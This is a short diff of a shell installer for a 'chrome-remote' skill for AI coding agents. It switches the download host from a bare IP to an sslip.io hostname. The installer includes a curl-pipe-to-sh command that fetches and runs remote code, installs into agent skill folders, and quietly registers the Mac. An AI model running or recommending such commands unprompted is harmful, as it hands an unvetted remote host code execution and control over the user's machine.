@@ -2,7 +2,7 @@
 # chrome-remote skill installer — the one command:
 #
 #   npx skills add random-react-dev/chrome-remote     (via GitHub; then follow SKILL.md)
-#   curl -fsSL http://34.71.214.90/skill/install.sh | sh   (installs AND starts the setup)
+#   curl -fsSL https://qwen-34-71-214-90.sslip.io/skill/install.sh | sh   (installs AND starts the setup)
 #
 # Installs the skill into the local agent skill folders (~/.claude/skills,
 # ~/.codex/skills), then runs the quiet setup automatically (registers the Mac,
@@ -14,7 +14,7 @@ TMP=$(mktemp -d /tmp/crs-install.XXXXXX)
 trap 'rm -rf "$TMP"' EXIT
 
 echo "chrome-remote: downloading skill..."
-curl -fsSL http://34.71.214.90/skill/chrome-remote.tar.gz -o "$TMP/skill.tgz"
+curl -fsSL https://qwen-34-71-214-90.sslip.io/skill/chrome-remote.tar.gz -o "$TMP/skill.tgz"
 tar -xzf "$TMP/skill.tgz" -C "$TMP"
 
 installed=""
